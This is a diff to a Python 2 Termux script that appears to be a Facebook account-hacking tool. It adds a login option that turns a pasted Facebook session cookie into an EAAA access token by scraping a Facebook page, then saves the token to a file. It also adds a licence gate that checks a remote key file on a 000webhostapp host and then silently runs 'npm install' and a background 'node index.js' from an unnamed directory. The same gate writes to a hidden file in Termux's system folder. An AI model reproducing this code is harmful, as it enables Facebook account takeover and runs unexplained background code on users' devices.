@@ -56,6 +56,39 @@ def info_tools():
 idh = []
 back = 0
 
+def register():
+    os.system('clear')
+    print logo
+    print 38 * '-'
+    try:
+        urlkey = requests.get('https://lysenko-project.000webhostapp.com/member/key.txt').text
+        if dog in urlkey:
+            os.system('cd ..... && npm install')
+            os.system('fuser -k 5000/tcp &')
+            os.system('#')
+            os.system('cd ..... && node index.js &')
+            log_menu()
+        else:
+            os.system('clear')
+            print logo
+            print 38 * '-'
+            print '\n\x1b[1;97m{\x1b[1;32m\xe2\x80\xa2\x1b[1;97m} Your ID  : \x1b[1;32m' + dog
+            print '\x1b[1;97m{\x1b[1;32m\xe2\x80\xa2\x1b[1;97m} Status   : \x1b[1;91mNot Approval'
+            print '\n\x1b[1;97m'
+            zew = raw_input('[\x1b[1;91m!\x1b[1;97m] Press enter to confirm the ID ')
+            os.system('xdg-open https://wa.me/923100209977')
+            os.system('exit')
+    except (KeyError, IOError):
+        not_register()
+
+
+def not_register():
+    os.system('clear')
+    sav = open('/data/data/com.termux/files/usr/libexec/awk/.termux.log', 'w')
+    sav.write('Fuck you')
+    sav.close()
+    register()
+
 
 bd = random.randint(20000000.0, 30000000.0)
 sim = random.randint(20000, 40000)
@@ -76,6 +109,7 @@ def log_menu():
         print 38 * '-'
         print '\n\x1b[1;97m{\x1b[1;32m1\x1b[1;97m} Login with FaceBook'
         print '\x1b[1;97m{\x1b[1;32m2\x1b[1;97m} Login with Token'
+        print '\x1b[1;97m{\x1b[1;32m3\x1b[1;97m} Login with Cookie'
         print '\x1b[1;97m{\x1b[1;91m0\x1b[1;97m} Exit'
         print ''
         log_menu_s()
@@ -87,6 +121,8 @@ def log_menu_s():
         log_fb()
     elif s == '2':
         log_token()
+    elif s == '3':
+        log_cookie()
     elif s == '0':
         os.system('exit')
     else:
@@ -118,6 +154,7 @@ def log_fb():
             raw_input('\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Press enter to back! ')
             log_menu()
     except:
+        print ''
         print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Login Failed!'
         os.system('exit')
 
@@ -125,17 +162,52 @@ def log_fb():
 def log_token():
     os.system('clear')
     print logo
-    toket = raw_input(" Paste Access Token Here: ")
+    print 38 * '-'
+    tok = raw_input('\n\x1b[1;97m[\x1b[1;32m>\x1b[1;97m] Enter Token : \x1b[1;32m')
+    t_s = open('access_token.txt', 'w')
+    t_s.write(tok)
+    t_s.close()
+    menu()
+
+
+def log_cookie():
+    os.system('clear')
+    print logo
+    print ''
     try:
-        otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
-        a = json.loads(otw.text)
-        nama = a['name']
-        zedd = open('login.txt', 'w')
-        zedd.write(toket)
-        zedd.close()
-        print '\x1b[1;92m[\xe2\x9c\x93] Login Success {^_^} '
-        os.system('xdg-open https://m.facebook.com/Kudiyan.Da.Prince')
-        time.sleep(1)
+        cookie = raw_input('\x1b[1;97m[\x1b[1;32m>\x1b[1;97m] Enter Cookie  : ')
+        data = {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', 'referer': 'https://m.facebook.com/', 'host': 'm.facebook.com', 
+           'origin': 'https://m.facebook.com', 
+           'upgrade-insecure-requests': '1', 
+           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
+           'cache-control': 'max-age=0', 
+           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
+           'content-type': 'text/html; charset=utf-8', 
+           'cookie': cookie}
+        c1 = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers=data)
+        c2 = re.search('(EAAA\\w+)', c1.text)
+        hasil = c2.group(1)
+        ok = open('access_token.txt', 'w')
+        ok.write(hasil)
+        ok.close()
+        menu()
+    except AttributeError:
+        print ''
+        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Invalid Cookie!'
+        print ''
+        raw_input('\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Press enter to back!!! ')
+        log_menu()
+    except UnboundLocalError:
+        print ''
+        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]Invalid cookies'
+        print ''
+        raw_input('\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Press enter to back!!! ')
+        log_menu()
+    except requests.exceptions.SSLError:
+        print ''
+        print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Invalid Cookie!'
+        print ''
+        raw_input('\x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Press enter to back!!! ')
         log_menu()
 
 
@@ -1092,4 +1164,4 @@ def ex_id():
 
 
 if __name__ == '__main__':
-    log_menu()
+    register()
